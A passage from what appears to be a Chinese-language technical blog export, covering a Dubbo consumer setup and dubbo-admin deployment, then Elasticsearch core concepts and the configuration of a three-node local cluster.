class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--dubbo--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--zookeeper--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--api接口工程--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>dubbo_liduoan_demo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>APIInteface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件application.properties</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring应用名</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">dubbo-demo-consumer</span></span><br><span class="line"><span class="comment"># 端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">20881</span></span><br><span class="line"><span class="comment"># dubbo应用id</span></span><br><span class="line"><span class="attr">spring.dubbo.application.id</span>=<span class="string">dubbo-demo-consumer</span></span><br><span class="line"><span class="comment"># dubbo应用名称</span></span><br><span class="line"><span class="attr">spring.dubbo.application.name</span>=<span class="string">dubbo-demo-consumer</span></span><br><span class="line"><span class="comment"># 应用负责人</span></span><br><span class="line"><span class="comment">#spring.dubbo.application.owner=xxx</span></span><br><span class="line"><span class="comment"># 组织名</span></span><br><span class="line"><span class="comment">#spring.dubbo.application.organization=xxx</span></span><br><span class="line"><span class="comment"># zookeeper注册中心地址（多个节点用分号隔开）</span></span><br><span class="line"><span class="attr">spring.dubbo.registry.address</span>=<span class="string">zookeeper://192.168.74.88:2181;zookeeper://192.168.74.88:2182</span></span><br><span class="line"><span class="comment"># 远程服务调用超时</span></span><br><span class="line"><span class="comment">#spring.dubbo.consumer.timeout=1000</span></span><br><span class="line"><span class="comment"># 远程服务调用重试次数</span></span><br><span class="line"><span class="comment">#spring.dubbo.consumer.retries=0</span></span><br><span class="line"><span class="comment"># 集群容错策略</span></span><br><span class="line"><span class="comment">#spring.dubbo.consumer.cluster=failover</span></span><br><span class="line"><span class="comment"># 负载均衡策略</span></span><br><span class="line"><span class="comment">#spring.dubbo.consumer.loadbalance=random</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDubboConfiguration</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerApplication</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		SpringApplication.run(ConsumerApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Controller调用服务</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span></span><br><span class="line">    <span class="keyword">private</span> HelloSerrvice helloSerrvice;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sayhello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helloSerrvice.sayHello(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在该Controller中，我们需要调用之前的服务提供者的HelloService接口，可是该接口的实现类在服务提供者微服务中，不在同一个模块中，就不能使用Spring的@Autowired注解注入。Dubbo为我们提供了一个**@Reference**注解，相当于”远程注入”。其中常用的属性如下：</p>
<ol>
<li>cluster : 集群容错策略(failover, failfast, failsafe, failback, forking)</li>
<li>retries : 重试次数</li>
<li>loadbalance ：负载均衡策略(random, roundrobin, leastactive)</li>
<li>timeout : 超时时长</li>
<li>actives : 占用连接最大请求数(优先级高于@Service注解中的配置)</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这样，我们就完成了了入门程序的编写。与之前的Spring Cloud相比有何不同？</p>
<p>之前我们Spring Cloud的服务接口都是定义在<strong>Controller层</strong>，通过Feign进行远程调用，这是因为Feign是基于Http进行调用，只要知道服务方的url即可。而在Dubbo中，我们的服务接口定义在了<strong>Service层</strong>，需要使用的时候只要在消费者方用@Reference注入即可，这样就可以像调用本地服务那样调用远程服务。</p>
<p>但是Dubbo有一个无法克服的缺点，就是服务提供方和消费方在带在代码上会产生<strong>依赖性</strong>，这是因为服务接口需要同时被服务提供方所依赖(在pom文件中可用看到)。</p>
<h1 id="Dubbo管理平台"><a href="#Dubbo管理平台" class="headerlink" title="Dubbo管理平台"></a>Dubbo管理平台</h1><p>Dubbo提供了功能非常强大的管理平台，有两个版本，我们分别介绍。</p>
<h2 id="老版本"><a href="#老版本" class="headerlink" title="老版本"></a>老版本</h2><ul>
<li>下载地址</li>
</ul>
<p>war包下载地址：<a class="link"   href="https://github.com/apache/dubbo/tree/2.5.x" >https://github.com/apache/dubbo/tree/2.5.x<i class="fas fa-external-link-alt"></i></a> （分支为2.5.x）</p>
<p>jar包下载地址：<a class="link"   href="https://github.com/apache/dubbo-admin/tree/master" >https://github.com/apache/dubbo-admin/tree/master<i class="fas fa-external-link-alt"></i></a> （分支为master)</p>
<blockquote>
<p>无论是jar版还是war版，dubbo-admin就是Dubbo管理平台所在的目录，如果没有看到，说明选择的分支不对。</p>
</blockquote>
<ul>
<li>修改配置文件</li>
</ul>
<p>jar版本的配置文件是dubbo-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties，war版本的配置文件dubbo-admin&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;dubbo.properties。修改其中的注册中心(Zookeeper)地址即可。</p>
<ul>
<li>打包</li>
</ul>
<p>在dubbo-admin目录执行以下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mvn clean package -Dmaven.test.skip=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>打包后可将名称修改为dubbo-admin.jar(dubbo-admin.war)</p>
<ul>
<li>运行</li>
</ul>
<p>jar版本的通过如下命令运行:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -jar dubbo-admin.jar</span><br></pre></td></tr></table></figure>

<p>war版本的需要用<strong>tomcat</strong>运行。将war包放在tomcat的webapps目录下后，在bin目录下通过如下命令运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>访问(以本机为例)</li>
</ul>
<p>jar版本的访问地址: localhost:7001 (端口号可在配置文件修改)</p>
<p>war版本的访问地址：localhost:8080&#x2F;dubbo-admin</p>
<p>访问后输入账号root和密码root(可在配置文件中修改)即可登录</p>
<h2 id="新版本"><a href="#新版本" class="headerlink" title="新版本"></a>新版本</h2><p>相比于老版本，新版本采用了前后端分离的开发方式，前端使用Vue.js进行开发，后端使用Springboot。因此要确保安装了node环境。</p>
<ul>
<li>下载地址：<a class="link"   href="https://github.com/apache/dubbo-admin/tree/develop" >https://github.com/apache/dubbo-admin/tree/develop<i class="fas fa-external-link-alt"></i></a> (develop分支)</li>
<li>修改配置文件</li>
</ul>
<p>进入dubbo-server(后台)目录，修改src&#x2F;main&#x2F;resources目录中的application.properties配置文件，将注册中心的地址改为自己的即可。</p>
<ul>
<li>打包</li>
</ul>
<p>进入dubbo-server(后台)目录，执行以下命令打包:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mvn clean package -Dmaven.test.skip=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>运行</li>
</ul>
<p>后台jar包通过如下命令运行:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -jar dubbo-admin-server.jar</span><br></pre></td></tr></table></figure>

<p>进入dubbo-admin-ui(前端)目录，通过如下命令运行:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch</title>
    <url>/2021/03/11/2021/ElasticSearch/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h1><h1 id="Elasticsearch核心概念"><a href="#Elasticsearch核心概念" class="headerlink" title="Elasticsearch核心概念"></a><strong>Elasticsearch核心概念</strong></h1><h3 id="1-1-索引-index"><a href="#1-1-索引-index" class="headerlink" title="1.1 索引 index"></a>1.1 索引 index</h3><p>一个索引就是一个拥有几分相似特征的文档的集合。比如说，你可以有一个客户数据的索引，另一个产品目录的索引，还有一个订单数据的索引。一个索引由一个名字来标识（必须全部是小写字母的），并且当我们要对对应于这个索引中的文档进行索引、搜索、更新和删除的时候，都要使用到这个名字。在一个集群中，可以定义任意多的索引。</p>
<h3 id="1-2-类型-type"><a href="#1-2-类型-type" class="headerlink" title="1.2 类型 type"></a>1.2 类型 type</h3><p>在一个索引中，你可以定义一种或多种类型。一个类型是你的索引的一个逻辑上的分类&#x2F;分区，其语义完全由你来定。通常，会为具有一组共同字段的文档定义一个类型。比如说，我们假设你运营一个博客平台并且将你所有的数据存储到一个索引中。在这个索引中，你可以为用户数据定义一个类型，为博客数据定义另一个类型，当然，也可以为评论数据定义另一个类型。</p>
<h3 id="1-3-字段Field"><a href="#1-3-字段Field" class="headerlink" title="1.3 字段Field"></a>1.3 字段Field</h3><p>相当于是数据表的字段，对文档数据根据不同属性进行的分类标识</p>
<h3 id="1-4-映射-mapping"><a href="#1-4-映射-mapping" class="headerlink" title="1.4 映射 mapping"></a>1.4 映射 mapping</h3><p>mapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。</p>
<h3 id="1-5-文档-document"><a href="#1-5-文档-document" class="headerlink" title="1.5 文档 document"></a>1.5 文档 document</h3><p>一个文档是一个可被索引的基础信息单元。比如，你可以拥有某一个客户的文档，某一个产品的一个文档，当然，也可以拥有某个订单的一个文档。文档以JSON（Javascript Object Notation）格式来表示，而JSON是一个到处存在的互联网数据交互格式。</p>
<p>在一个index&#x2F;type里面，你可以存储任意多的文档。注意，尽管一个文档，物理上存在于一个索引之中，文档必须被索引&#x2F;赋予一个索引的type。</p>
<h3 id="1-6-接近实时-NRT"><a href="#1-6-接近实时-NRT" class="headerlink" title="1.6 接近实时 NRT"></a>1.6 接近实时 NRT</h3><p>Elasticsearch是一个接近实时的搜索平台。这意味着，从索引一个文档直到这个文档能够被搜索到有一个轻微的延迟（通常是1秒以内）</p>
<h3 id="1-7-集群-cluster"><a href="#1-7-集群-cluster" class="headerlink" title="1.7 集群 cluster"></a>1.7 集群 cluster</h3><p>一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。一个集群由一个唯一的名字标识，这个名字默认就是“elasticsearch”。这个名字是重要的，因为一个节点只能通过指定某个集群的名字，来加入这个集群</p>
<h3 id="1-8-节点-node"><a href="#1-8-节点-node" class="headerlink" title="1.8 节点 node"></a>1.8 节点 node</h3><p>一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。和集群类似，一个节点也是由一个名字来标识的，默认情况下，这个名字是一个随机的漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说挺重要的，因为在这个管理过程中，你会去确定网络中的哪些服务器对应于Elasticsearch集群中的哪些节点。</p>
<p>一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做“elasticsearch”的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做“elasticsearch”的集群中。</p>
<p>在一个集群里，只要你想，可以拥有任意多个节点。而且，如果当前你的网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做“elasticsearch”的集群。</p>
<h3 id="1-9-分片和复制-shards-amp-replicas"><a href="#1-9-分片和复制-shards-amp-replicas" class="headerlink" title="1.9 分片和复制 shards&amp;replicas"></a>1.9 分片和复制 shards&amp;replicas</h3><p>一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当你创建一个索引的时候，你可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的“索引”，这个“索引”可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：<br>1）允许你水平分割&#x2F;扩展你的内容容量。<br>2）允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能&#x2F;吞吐量。</p>
<p>至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。</p>
<p>在一个网络&#x2F;云的环境里，失败随时都可能发生，在某个分片&#x2F;节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。</p>
<p>复制之所以重要，有两个主要原因： 在分片&#x2F;节点失败的情况下，提供了高可用性。因为这个原因，注意到复制分片从不与原&#x2F;主要（original&#x2F;primary）分片置于同一节点上是非常重要的。扩展你的搜索量&#x2F;吞吐量，因为搜索可以在所有的复制上并行运行。总之，每个索引可以被分成多个分片。一个索引也可以被复制0次（意思是没有复制）或多次。一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。分片和复制的数量可以在索引创建的时候指定。在索引创建之后，你可以在任何时候动态地改变复制的数量，但是你事后不能改变分片的数量。</p>
<p>默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制，这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），这样的话每个索引总共就有10个分片。</p>
<h1 id="ElasticSearch集群"><a href="#ElasticSearch集群" class="headerlink" title="ElasticSearch集群"></a>ElasticSearch集群</h1><p>​	ES集群是一个 P2P类型(使用 gossip 协议)的分布式系统，除了集群状态管理以外，其他所有的请求都可以发送到集群内任意一台节点上，这个节点可以自己找到需要转发给哪些节点，并且直接跟这些节点通信。所以，从网络架构及服务配置上来说，构建集群所需要的配置极其简单。在 Elasticsearch 2.0 之前，无阻碍的网络下，所有配置了相同 cluster.name 的节点都自动归属到一个集群中。2.0 版本之后，基于安全的考虑避免开发环境过于随便造成的麻烦，从 2.0 版本开始，默认的自动发现方式改为了单播(unicast)方式。配置里提供几台节点的地址，ES 将其视作 gossip router 角色，借以完成集群的发现。由于这只是 ES 内一个很小的功能，所以 gossip router 角色并不需要单独配置，每个 ES 节点都可以担任。所以，采用单播方式的集群，各节点都配置相同的几个节点列表作为 router 即可。</p>
<p>​	集群中节点数量没有限制，一般大于等于2个节点就可以看做是集群了。一般处于高性能及高可用方面来考虑一般集群中的节点数量都是3个及3个以上。</p>
<h2 id="6-1-集群的相关概念"><a href="#6-1-集群的相关概念" class="headerlink" title="6.1 集群的相关概念"></a>6.1 集群的相关概念</h2><h3 id="6-1-1-集群-cluster"><a href="#6-1-1-集群-cluster" class="headerlink" title="6.1.1 集群 cluster"></a>6.1.1 集群 cluster</h3><p>一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。一个集群由一个唯一的名字标识，这个名字默认就是“elasticsearch”。这个名字是重要的，因为一个节点只能通过指定某个集群的名字，来加入这个集群</p>
<h3 id="6-1-2-节点-node"><a href="#6-1-2-节点-node" class="headerlink" title="6.1.2 节点 node"></a>6.1.2 节点 node</h3><p>一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。和集群类似，一个节点也是由一个名字来标识的，默认情况下，这个名字是一个随机的漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说挺重要的，因为在这个管理过程中，你会去确定网络中的哪些服务器对应于Elasticsearch集群中的哪些节点。</p>
<p>一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做“elasticsearch”的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做“elasticsearch”的集群中。</p>
<p>在一个集群里，只要你想，可以拥有任意多个节点。而且，如果当前你的网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做“elasticsearch”的集群。</p>
<h3 id="6-1-3-分片和复制-shards-amp-replicas"><a href="#6-1-3-分片和复制-shards-amp-replicas" class="headerlink" title="6.1.3 分片和复制 shards&amp;replicas"></a>6.1.3 分片和复制 shards&amp;replicas</h3><p>一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当你创建一个索引的时候，你可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的“索引”，这个“索引”可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：<br>1）允许你水平分割&#x2F;扩展你的内容容量。<br>2）允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能&#x2F;吞吐量。</p>
<p>至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。</p>
<p>在一个网络&#x2F;云的环境里，失败随时都可能发生，在某个分片&#x2F;节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。</p>
<p>复制之所以重要，有两个主要原因： 在分片&#x2F;节点失败的情况下，提供了高可用性。因为这个原因，注意到复制分片从不与原&#x2F;主要（original&#x2F;primary）分片置于同一节点上是非常重要的。扩展你的搜索量&#x2F;吞吐量，因为搜索可以在所有的复制上并行运行。总之，每个索引可以被分成多个分片。一个索引也可以被复制0次（意思是没有复制）或多次。一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。分片和复制的数量可以在索引创建的时候指定。在索引创建之后，你可以在任何时候动态地改变复制的数量，但是你事后不能改变分片的数量。</p>
<p>默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制，这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），这样的话每个索引总共就有10个分片。</p>
<h2 id="6-2-集群的搭建"><a href="#6-2-集群的搭建" class="headerlink" title="6.2 集群的搭建"></a>6.2 集群的搭建</h2><h3 id="6-2-1-准备三台elasticsearch服务器"><a href="#6-2-1-准备三台elasticsearch服务器" class="headerlink" title="6.2.1 准备三台elasticsearch服务器"></a>6.2.1 准备三台elasticsearch服务器</h3><p>创建elasticsearch-cluster文件夹，在内部复制三个elasticsearch服务</p>
<h3 id="6-2-2-修改每台服务器配置"><a href="#6-2-2-修改每台服务器配置" class="headerlink" title="6.2.2 修改每台服务器配置"></a>6.2.2 修改每台服务器配置</h3><p>修改elasticsearch-cluster\node*\config\elasticsearch.yml配置文件</p>
<h4 id="node1节点："><a href="#node1节点：" class="headerlink" title="node1节点："></a>node1节点：</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#节点1的配置信息：</span></span><br><span class="line"><span class="comment">#集群名称，保证唯一</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-elasticsearch</span></span><br><span class="line"><span class="comment">#节点名称，必须不一样</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1</span></span><br><span class="line"><span class="comment">#必须为本机的ip地址</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">#服务端口号，在同一机器下必须不一样</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">9200</span></span><br><span class="line"><span class="comment">#集群间通信端口号，在同一机器下必须不一样</span></span><br><span class="line"><span class="attr">transport.tcp.port:</span> <span class="number">9300</span></span><br><span class="line"><span class="comment">#设置集群自动发现机器ip集合</span></span><br><span class="line"><span class="attr">discovery.zen.ping.unicast.hosts:</span> [<span class="string">&quot;127.0.0.1:9300&quot;</span>,<span class="string">&quot;127.0.0.1:9301&quot;</span>,<span class="string">&quot;127.0.0.1:9302&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="node2节点："><a href="#node2节点：" class="headerlink" title="node2节点："></a>node2节点：</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#节点2的配置信息：</span></span><br><span class="line"><span class="comment">#集群名称，保证唯一</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-elasticsearch</span></span><br><span class="line"><span class="comment">#节点名称，必须不一样</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-2</span></span><br><span class="line"><span class="comment">#必须为本机的ip地址</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">#服务端口号，在同一机器下必须不一样</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">9201</span></span><br><span class="line"><span class="comment">#集群间通信端口号，在同一机器下必须不一样</span></span><br><span class="line"><span class="attr">transport.tcp.port:</span> <span class="number">9301</span></span><br><span class="line"><span class="comment">#设置集群自动发现机器ip集合</span></span><br><span class="line"><span class="attr">discovery.zen.ping.unicast.hosts:</span> [<span class="string">&quot;127.0.0.1:9300&quot;</span>,<span class="string">&quot;127.0.0.1:9301&quot;</span>,<span class="string">&quot;127.0.0.1:9302&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="node3节点："><a href="#node3节点：" class="headerlink" title="node3节点："></a>node3节点：</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#节点3的配置信息：</span></span><br><span class="line"><span class="comment">#集群名称，保证唯一</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-elasticsearch</span></span><br><span class="line"><span class="comment">#节点名称，必须不一样</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-3</span></span><br><span class="line"><span class="comment">#必须为本机的ip地址</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">#服务端口号，在同一机器下必须不一样</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">9202</span></span><br><span class="line"><span class="comment">#集群间通信端口号，在同一机器下必须不一样</span></span><br><span class="line"><span class="attr">transport.tcp.port:</span> 